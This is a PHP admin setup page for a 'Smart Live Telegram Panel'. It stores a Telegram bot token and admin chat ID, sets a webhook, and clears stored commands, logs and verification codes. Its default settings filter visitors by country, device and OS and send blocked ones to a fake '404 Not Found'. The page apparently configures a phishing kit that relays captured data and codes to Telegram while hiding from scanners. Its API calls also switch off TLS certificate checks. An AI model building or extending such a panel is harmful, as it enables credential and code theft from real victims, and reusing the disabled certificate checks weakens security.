<?php

$panel_messages = [];

require_once __DIR__ . '/../includes/php/webhook_url.php';

function panel_telegram_http_get($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_CONNECTTIMEOUT => 15,
            CURLOPT_TIMEOUT => 30,
        ]);
        $out = curl_exec($ch);
        curl_close($ch);
        return $out === false ? '' : (string) $out;
    }
    if (ini_get('allow_url_fopen')) {
        $ctx = stream_context_create(['http' => ['timeout' => 30], 'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]]);
        $r = @file_get_contents($url, false, $ctx);
        return $r === false ? '' : (string) $r;
    }
    return '';
}

$configPath = __DIR__ . '/../config.json';

$defaultConfigKeys = [
    'allow_countries' => 'ALL',
    'allow_devices' => 'Desktop|Tablet|Mobile',
    'allow_os' => 'Windows|macOS|Linux|Android|iOS',
    'redirect_url_blocked' => '404 Not Found',
    'redirect_url_success' => 'https://google.com',
    'bot_modes' => 'off',
];

$panel_diag = [
    'curl' => function_exists('curl_init') ? 'available' : 'missing',
    'allow_url_fopen' => ini_get('allow_url_fopen') ? 'on' : 'off',
    'root_writable' => is_writable(__DIR__ . '/../') ? 'yes' : 'no',
];

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['reset'])) {
    $dirs = ['commands', 'logs', 'codes'];
    foreach ($dirs as $dir) {
        $path = __DIR__ . '/' . $dir . '/';
        if (is_dir($path)) {
            $files = glob($path . '*');
            if (is_array($files)) {
                foreach ($files as $file) {
                    if (is_file($file) && basename($file) !== 'index.php') {
                        @unlink($file);
                    }
                }
            }
        }
    }
    if (is_file($configPath)) {
        @unlink($configPath);
    }
    $panel_messages[] = ['ok', 'All old data cleared. Command files, logs, codes, and config were removed. Enter a new bot token and chat ID below.'];
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['verify'])) {
    $token = trim((string) ($_POST['token'] ?? ''));
    $chat_id = trim((string) ($_POST['chat_id'] ?? ''));
    if ($token === '' || $chat_id === '') {
        $panel_messages[] = ['err', 'Enter both bot token and chat ID.'];
    } elseif (!preg_match('/^\d+:[A-Za-z0-9_-]+$/', $token)) {
        $panel_messages[] = ['err', 'Token format is invalid (expected digits, colon, then BotFather secret).'];
    } else {
        $getMeUrl = 'https://api.telegram.org/bot' . $token . '/getMe';
        $getMeRaw = panel_telegram_http_get($getMeUrl);
        $getMe = json_decode($getMeRaw, true);
        if (!is_array($getMe) && trim((string) $getMeRaw) === '') {
            $panel_messages[] = ['err', 'Telegram API returned an empty response. Server HTTP diag: cURL=' . $panel_diag['curl'] . ', allow_url_fopen=' . $panel_diag['allow_url_fopen'] . '.'];
            $getMe = null;
        }
        if (is_array($getMe) && !empty($getMe['ok'])) {
            panel_telegram_http_get('https://api.telegram.org/bot' . $token . '/deleteWebhook?drop_pending_updates=1');
            $existing = [];
            if (is_readable($configPath)) {
                $decoded = json_decode((string) file_get_contents($configPath), true);
                if (is_array($decoded)) {
                    $existing = $decoded;
                }
            }
            $merged = array_merge($defaultConfigKeys, $existing, [
                'bot_token' => $token,
                'chat_id' => $chat_id,
                'status' => 'online',
                'panel' => 'live',
            ]);
            if (file_put_contents($configPath, json_encode($merged, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES)) !== false) {
                $panel_messages[] = ['ok', 'Token is valid, webhook removed for this bot, and credentials saved to config.json. Use “Set Webhook” to point Telegram at this server.'];
            } else {
                $panel_messages[] = ['err', 'Could not write config.json. Root writable: ' . $panel_diag['root_writable'] . '. Check file permissions (commands/, logs/, codes/, and config.json parent dir).'];
            }
        } else {
            $desc = is_array($getMe) && isset($getMe['description']) ? (string) $getMe['description'] : 'Could not reach Telegram API (check cURL / allow_url_fopen).';
            $panel_messages[] = ['err', 'Invalid token or API error: ' . $desc];
        }
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['set_webhook'])) {
    require_once __DIR__ . '/../includes/php/config.php';
    $token = trim((string) ($config['bot_token'] ?? ''));
    if ($token === '') {
        $panel_messages[] = ['err', 'No bot token in config. Run Verify first.'];
    } else {
        $webhookUrl = panel_public_webhook_url();
        $setUrl = 'https://api.telegram.org/bot' . $token . '/setWebhook?url=' . rawurlencode($webhookUrl);
        $respRaw = panel_telegram_http_get($setUrl);
        $resp = json_decode($respRaw, true);
        if (is_array($resp) && !empty($resp['ok'])) {
            $panel_messages[] = ['ok', 'Webhook set to: ' . $webhookUrl];
        } else {
            $d = is_array($resp) && isset($resp['description']) ? (string) $resp['description'] : htmlspecialchars($respRaw, ENT_QUOTES, 'UTF-8');
            if (trim((string) $respRaw) === '') {
                $d = 'Telegram API returned an empty response.';
                $d .= ' Server HTTP diag: cURL=' . $panel_diag['curl'] . ', allow_url_fopen=' . $panel_diag['allow_url_fopen'] . '.';
            }
            $panel_messages[] = ['err', 'setWebhook failed: ' . $d];
        }
        if (strncasecmp($webhookUrl, 'http://', 7) === 0) {
            $panel_messages[] = ['err', 'Warning: Telegram requires HTTPS for webhooks on the public internet. Use SSL or a reverse proxy before going live.'];
        }
    }
}

$js_enabled = false;

$server = array(
    'disabled',
    'disabled',
    'disabled',
    'disabled',
    'disabled',
    'disabled',
);

$correct = 0;

if (function_exists('session_start')) {
    $server[0] = 'enabled';
    $correct++;
}
if (extension_loaded('curl')) {
    $server[1] = 'enabled';
    $correct++;
}

if (function_exists('uniqid') && function_exists('md5')) {
    $server[2] = 'enabled';
    $correct++;
}

if (function_exists('ob_start')) {
    $server[3] = 'enabled';
    $correct++;
}

$images_functions = [
    'imagecreatefromjpeg', 
    'imagesx', 
    'imagesy', 
    'imagecreatetruecolor', 
    'imagecolorallocatealpha', 
    'imagefill', 
    'imagecopyresized',
    'imagecolorallocate',
    'imagettftext',
    'imagepng',
    'imagedestroy'];

foreach ($images_functions as $function) {
    if (function_exists($function)) {
        $server[4] = 'enabled';
        $correct++;
    }else{
    }
}



?>  
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Smart Live Telegram Panel v2</title>
    <link rel="preload" href="css/t5t6IRMbNJ6TQG7Il_EKPqP9zTnvqouPWhojrg.woff2" as="font" type="font/woff2" crossorigin="anonymous">
    <link rel="preload" href="css/t5t6IRMbNJ6TQG7Il_EKPqP9zTnvqouBWho.woff2" as="font" type="font/woff2" crossorigin="anonymous">
    <link rel="preload" href="css/gNMHW3x8Qoy5_mf8uWMFMIo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
    <link rel="preload" href="css/gNMHW3x8Qoy5_mf8uWMLMIqK_Q.woff2.woff2" as="font" type="font/woff2" crossorigin="anonymous">
    <link rel="preload" href="css/4iCs6KVjbNBYlgoKcQ72j00.woff2" as="font" type="font/woff2" crossorigin="anonymous">
    <link rel="preload" href="css/4iCs6KVjbNBYlgoKfw72.woff2" as="font" type="font/woff2" crossorigin="anonymous">
    <link href="css/aos.css" rel="stylesheet">
    <link href="css/index.css" rel="stylesheet">
    <link href="css/fonts.css" rel="stylesheet">
    <script src="js/aos.js"></script>
    <script>
        <?php $js_enabled = true; ?>
    </script>
    <?php 
    if ($js_enabled == true) {
        $server[5] = 'enabled';
        $correct++;
    }
    ?>
</head>
<body>
    <style>
        .panel-portable { max-width: 640px; margin: 1rem auto 0; padding: 1rem 1.25rem; background: rgba(20,24,32,.92); border: 1px solid rgba(255,255,255,.12); border-radius: 12px; color: #e8eaed; font-family: system-ui, sans-serif; position: relative; z-index: 10000; }
        .panel-portable h2 { margin: 0 0 .5rem; font-size: 1.15rem; }
        .panel-portable .hint { font-size: .85rem; opacity: .85; margin: 0 0 1rem; line-height: 1.4; }
        .panel-msg { padding: .6rem .75rem; border-radius: 8px; margin-bottom: .75rem; font-size: .9rem; }
        .panel-msg.ok { background: rgba(46,125,50,.25); border: 1px solid rgba(129,199,132,.4); }
        .panel-msg.err { background: rgba(198,40,40,.2); border: 1px solid rgba(239,83,80,.35); }
        .panel-portable label { display: block; font-size: .8rem; margin: .5rem 0 .2rem; opacity: .9; }
        .panel-portable input[type="text"] { width: 100%; box-sizing: border-box; padding: .5rem .6rem; border-radius: 8px; border: 1px solid rgba(255,255,255,.2); background: rgba(0,0,0,.35); color: #fff; }
        .panel-portable .row { display: flex; flex-wrap: wrap; gap: .5rem; align-items: center; margin-top: .75rem; }
        .panel-portable button, .panel-portable .btn-link { cursor: pointer; padding: .5rem 1rem; border-radius: 8px; border: none; font-size: .875rem; }
        .panel-portable button[type="submit"] { background: #1a73e8; color: #fff; }
        .panel-portable button[name="reset"] { background: rgba(255,255,255,.12); color: #e8eaed; }
        .panel-portable .btn-link { display: inline-block; text-decoration: none; background: transparent; color: #8ab4f8; padding: .25rem 0; }
        .panel-portable hr { border: none; border-top: 1px solid rgba(255,255,255,.1); margin: 1rem 0; }
    </style>
    <div class="panel-portable">
        <h2>Telegram panel — portable setup</h2>
        <p class="hint">Reset clears command files, logs, verification codes, and removes <code>config.json</code>. Then use <strong>Verify</strong> to validate your token and save credentials, and <strong>Set Webhook</strong> so callbacks hit this site. Ensure <code>client-area/commands</code>, <code>logs</code>, and <code>codes</code> are writable by the web server (e.g. chmod 775). Copy <code>config.example.json</code> to <code>config.json</code> only if you need a template; Verify creates the file for you.</p>
        <?php foreach ($panel_messages as $pm) {
            $cls = $pm[0] === 'ok' ? 'ok' : 'err';
            echo '<div class="panel-msg ' . $cls . '">' . htmlspecialchars($pm[1], ENT_QUOTES, 'UTF-8') . '</div>';
        } ?>
        <form method="post" class="row" onsubmit="return confirm('Delete all commands, logs, codes, and config.json?');">
            <button type="submit" name="reset" value="1">Reset everything</button>
        </form>
        <hr>
        <form method="post" autocomplete="off">
            <label for="setup_token">Bot token (from @BotFather)</label>
            <input id="setup_token" type="text" name="token" value="" placeholder="123456789:AAH...">
            <label for="setup_chat_id">Admin chat ID</label>
            <input id="setup_chat_id" type="text" name="chat_id" value="" placeholder="-1001234567890 or numeric ID">
            <div class="row">
                <button type="submit" name="verify" value="1">Verify</button>
            </div>
        </form>
        <hr>
        <form method="post">
            <p class="hint" style="margin:0 0 .5rem">Uses the token already saved in <code>config.json</code> and the current domain/path (<code>client-area/webhook.php</code>).</p>
            <div class="row">
                <button type="submit" name="set_webhook" value="1">Set webhook</button>
                <a class="btn-link" href="install.php">Advanced setup (filters &amp; redirects)</a>
            </div>
        </form>
    </div>
    <div class="app">
        <div class="background">
            <div style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAQAAAAECAYAAACp8Z5+AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyFpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTQyIDc5LjE2MDkyNCwgMjAxNy8wNy8xMy0wMTowNjozOSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIChXaW5kb3dzKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDo2REVERkRGMjg4RkIxMUU4OEVGRkEzRDZCN0QyQTEyNyIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDo2REVERkRGMzg4RkIxMUU4OEVGRkEzRDZCN0QyQTEyNyI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjZERURGREYwODhGQjExRTg4RUZGQTNENkI3RDJBMTI3IiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjZERURGREYxODhGQjExRTg4RUZGQTNENkI3RDJBMTI3Ii8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+tCXrZwAAACFJREFUeNpiZGBg+M8AIv7/ZwTRTAxogBEogyKAoQIgwABOKwcBZKwNbgAAAABJRU5ErkJggg==&quot;); background-repeat: repeat; height: 100%; width: 100%; position: fixed; z-index: 0;"></div>
        </div>
        <div class="box" style="display: none;">
            <div class="padding-element" data-aos="fade-right">
                <div class="txt-left">
                <p class="txt-color header-text font-doto txt-center head-text-border" data-aos="fade-right">Smart Live Telegram Panel v3</p>
                    <div>
                        <br>
                        <p class="txt-color header-text" style="font-size: 18px"><b>Server Compatibility</b></p>
                        <form id="continueForm" autocomplete="off" action="" method="post">
                            <div class="server">
                                <img src="img/<?php echo $server[0] ?>.png" alt="">
                                <p class="que-color que-text"><b>Session <?php echo $server[0] ?></b></p>
                            </div>
                            <div class="server">
                                <img src="img/<?php echo $server[1] ?>.png" alt="">
                                <p class="que-color que-text"><b>cURL <?php echo $server[1] ?></b></p>
                            </div> 
                            <div class="server">
                                <img src="img/<?php echo $server[2] ?>.png" alt="">
                                <p class="que-color que-text"><b>Unique ID <?php echo $server[2] ?></b></p>
                            </div> 
                            <div class="server">
                                <img src="img/<?php echo $server[3] ?>.png" alt="">
                                <p class="que-color que-text"><b>Output buffering <?php echo $server[3] ?></b></p>
                            </div> 
                            <div class="server">
                                <img src="img/<?php echo $server[4] ?>.png" alt="">
                                <p class="que-color que-text"><b>Image functions <?php echo $server[4] ?></b></p>
                            </div> 
                            <div class="server">
                                <img src="img/<?php echo $server[5] ?>.png" alt="">
                                <p class="que-color que-text"><b>JavaScript <?php echo $server[5] ?></b></p>
                            </div>
                            <?php if($correct == 16){ ?>
                            <div style="padding-top: 10px">
                                <a href="install.php">
                                <button type="button" class="btnRegular border-bottom-left border-bottom-right">Connect Now</button>
                                </a>
                            </div>
                            <?php }else{ ?>
                            <div class="server">
                                <p class="que-color que-text"><b></b></p>
                            </div> 
                            <?php } ?>
                        </form>
                    </div>
                </div>
            </div>
        </div>
        <div class="loading-screen">
            <div class="floating" style="text-align: center;">
                <div id="floatBarsG_1" class="floatBarsG"></div>
                <div id="floatBarsG_2" class="floatBarsG"></div>
                <div id="floatBarsG_3" class="floatBarsG"></div>
                <div id="floatBarsG_4" class="floatBarsG"></div>
                <div id="floatBarsG_5" class="floatBarsG"></div>
                <div id="floatBarsG_6" class="floatBarsG"></div>
                <div id="floatBarsG_7" class="floatBarsG"></div>
                <div id="floatBarsG_8" class="floatBarsG"></div>
            </div>
        </div>
        <noscript>
            <div>
                <p class="txt-color que-text"><span class="que-color" style="font-weight: 900 !important">*</span>Please enable JavaScript to continue</p>
            </div>
        </noscript>
    </div>
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            document.querySelector(".loading-screen").style.display = "none";
            document.querySelector('.box').style.display = null;
            AOS.init();
        });
    </script>
</body>
</html>